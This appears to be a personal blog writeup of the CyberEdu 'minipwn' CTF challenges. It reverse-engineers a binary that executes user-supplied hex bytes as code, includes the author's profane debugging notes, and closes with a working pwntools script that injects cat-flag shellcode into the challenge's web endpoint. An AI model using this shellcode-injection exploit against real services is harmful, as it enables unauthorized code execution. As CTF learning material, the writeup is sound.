+++
date = '2026-05-02'
draft = false
title = 'CyberEdu minipwn & minipwn2 Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn"]
+++

## Challenge overview

Desi pare o aplicatie simpla suspectam ca autorul a introdus un backdoor. Trebuie sa aflam daca acesta exista si daca il putem exploata pentru a obtine acces la steag (/flag.txt).

---

minipwn is just like minipwn2 except they left /flag.txt as readable to anyone. So you can just go to /flag.txt and read it. But not in the second one.

---

We do get a web instance this time:

![challenge-screenshot](web.png#center)


## Identifying the vulnerabilities

In the binary, there are a couple interesting things happening. 

The `__ctype_b_loc()` function is being used, more about that I found [here](https://stackoverflow.com/questions/37702434/ctype-b-loc-what-is-its-purpose).

```c
unsigned __int64 __fastcall sub_11B9(const char *a1, char **a2)
{
  while ( ((*__ctype_b_loc())[*a1] & 0x2000) != 0 )
    ++a1;
  return strtoul(a1, a2, 16); //unsigned hexa
}
```

![challenge-screenshot](elab.png#center)

So the bits in our number are - and get ready - 0000 - alphanumeric - punctuation - control character - ... - lowercase - uppercase. But, this is being checked against `& 0x2000` or, in bits, `& 0010000000000000`. But, the function's first 4 bits will always be 0. Any bit `& 0` is 0, so the only chance of this being different to null is that third bit in our function result being 1 as well. 

So, it's always going to be 0. Genuinely. That means it just returns str to unsigned long of our parameter. That felt weird, but I found this other [article](https://braincoke.fr/blog/2018/05/what-is-ctype-b-loc/#about-__ctype_b_loc) confirming it. So, it really does only go up to the twelvth byte.

Essentially, this function coverts `s` with `strtoul` and puts it into `s`'s address.

```c
unsigned __int64 __fastcall im_strtoul(const char *s, char **s_addr)
{
  while ( ((*__ctype_b_loc())[*s] & 0x2000) != 0 )
    ++s;
  return strtoul(s, s_addr, 16);
}
```

Then we have this other function getting called by main:

```c
....
 v22 = 0;
  v23 = 0;
  v24 = 0;
  v25 = 0;
  v26 = 0;
  v27 = 0;
  if ( a2 <= 190 )
  {
    snprintf(s, a2 + 7, "Salut %s", a1);
    return printf(s);
  }
  return result;
}
```

`snprintf` just does `printf` of `a2+7` bytes, of `Salut a1` into `s`.

So we somehow need to control the parameters in main. We can input something when running the binary, which is then moved into `a1`, and it looks like it represents the number of parameters + 1.

`start 2 2 2 2 29` -> rdi = 0x6.

`start 2 2 2 2 29 989898 1313 001` -> rdi = 0x9.

This just checks that we only input one parameter. And even though they're referring to it as a2 in the decompilation, `rdi` is the one getting checked against '12 34', and it's the one getting its length checked.

So, we need our input to be '12 34' but using spaces skips this check altogether. And the web suggest that we input hex, without the 0x part, as a parameter. 

![challenge-screenshot](cump.png#center)

The *backdoor* would take the result of this function, move it in dest, and execute it as instructions.

```c
_BYTE *__fastcall sub_1212(char *our_param, _DWORD *a2)
{
  size_t len; // rax
  char v3; // al
  char *s; // [rsp+8h] [rbp-18h] BYREF
  _BYTE *mallocation; // [rsp+10h] [rbp-10h]
  _BYTE *v7; // [rsp+18h] [rbp-8h]

  s = our_param;
  len = strlen(our_param);
  mallocation = malloc((len + 1) / 3);
  v7 = mallocation;
  while ( *s )
  {
    v3 = im_strtoul(s, &s);
    *v7++ = v3;
  }
  *a2 = (_DWORD)v7 - (_DWORD)mallocation;
  return mallocation;
}
```

This is the function returning what's getting executed. To me, at least now, it looks like its malloc-ing our parameter (more specifically, the first third), turning it into a ul, character by character, and returning that. But to confirm we should get there with our debugger.

![challenge-screenshot](bum.png#center)

Well, that's a bummer, that's just the first (well, last) character. And if we made our parameter too long, it would just set itself to '0xff'. Writing `41414141414141` for example, just returned 'Salut A'.

Sending `'"12 34"'` did consider it as just one string instead of two. But it didn't pass the check.
  
I even tried a backslash escape for the space but they escaped by escape like `'12\\ 34'`.

I think I fucking did it with unicode escapes... I sent `r '12 344'` ... "\u200D" zero width joiner... At this point after the unicode escape being necessary I'm thinking this is an extraordinarily elaborate challenge; 

Since after any hex number I would input, it took ONLY the last byte and executed it. So how am I supposed to get it to execute `cat /flag.txt` in one byte? I thought, either get the hex `strtoul` function to return more than one character, or somehow become the binary exploitation master who can jmp back to the rest of our input with only a single byte. These were my notes from this dark period of my life. Feel free to [skip over this](https://irinasusca.github.io/writeup-blog/posts/minipwn-writeup/#the-exploit).

## "Notes"
  
  > we can make it call jmp += until the rest of our bytes ! 
  
  > is jmp +=x one byte? (note from future - nope)
  
  > jmp to r9 ; in r9 is out exact bytes : 0x4300313431343134
  
  > problem; we have a singel byte and most instructions are 2 bytes long.. can we get this functiin to return 2 bytes, or do we make our explot one byte..
  
  > i changed the byte to `\xeb` (aka jump ) and its trying to jump 2 bytes.. bad..
  
  ![challenge-screenshot](jump.png#center)
  
  > but why tf is it rying jump to 0x7fffffffd972 (2 bytes!) 
  
  > e9 tried to jump 5 bytes.
  but we want it to jmp 0x60f. :/  
  
  > wait... inside s, strtoul is put... waht if we make it a valid address?
  so that it loops again? 
  like 0xffffffffff and so on
  but v3 is a char
  
  >the point is we want this while to happen twice. for two bytes of shellcode.
  lets test.


   `r '12 34498765432125f'`
   
   > nu o fucking gunctionat.. tot returneaza un singur gunoi 
   chiar am incercat puii mei singura solutie ar fi sa facem cumva sa scriem doi bytes in fctia pulii
   
   > `al & al` ; prima data e 0x35 &0x35 adica primii bytes din inputul nostru

  ![challenge-screenshot](zfkc.png#center)
  
  > here .. trying to see how to get this fucker to run tiwece
  
  > its taking one byte from `0x4746524f4c4f4300` exactly the null byte (lol) and putting that into `eax` turning `al` null
  
  > wtf is that string its `COLORFGBG=15;0`  lol
  
  > so first time taking the last byte from our string ,next time taking it from the fucking *bg color*?
  
  > ok new plan - just fill the stack with crap maybe its gonna overwrite the bg color variable
  
  > but our input grows the other way. so wtf? env variables decide whether our input hapes on not? nice!!!
   
## The exploit
   
This was driving me absolutely CRAZY so I asked a friend about how he solved it, and, turns out he hadn't finished it either. So we made the exploit together.

The way I was passing the parameter inside the debugger was breaking it, and pwntools had a tool for this. Apparently, I didn't even have to unicode escape the space. It was just `pwndbg` messing with it.
   
And, as the `12 34` was indicating, the hex needed to be separated into bytes with spaces. I mean like `41 41 41`. That must've been why it was only taking my last byte in consideration for execution. Now it seems so obvious but it really wasn't at the time.

So here is my exploit:

```python
from pwn import *
import requests

url = "http://35.246.235.205:31454/index.php"
elf = ELF('/home/kali/Downloads/minipwn')
#p=elf.process()

context.arch = 'amd64'

ip, port = cyberedu.split(':')
port = int(port)
  
stringy = ''

shellcat = asm(shellcraft.cat('/flag.txt'))

stringy = shellcat.hex(' ')
    
payload = '12 34 ' + stringy 
    
print(payload)
print(len(payload))

data = {
    'pwn': (payload),
    'submit': "Pwn"
}

res = requests.post(url, data=data)
print(res.text)

p = elf.process(argv=[payload])
p.interactive()
```

![challenge-screenshot](flag1.png#center)

This was the worst challenge I've solved these days by *far*. 

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/minipwn2.py)**.
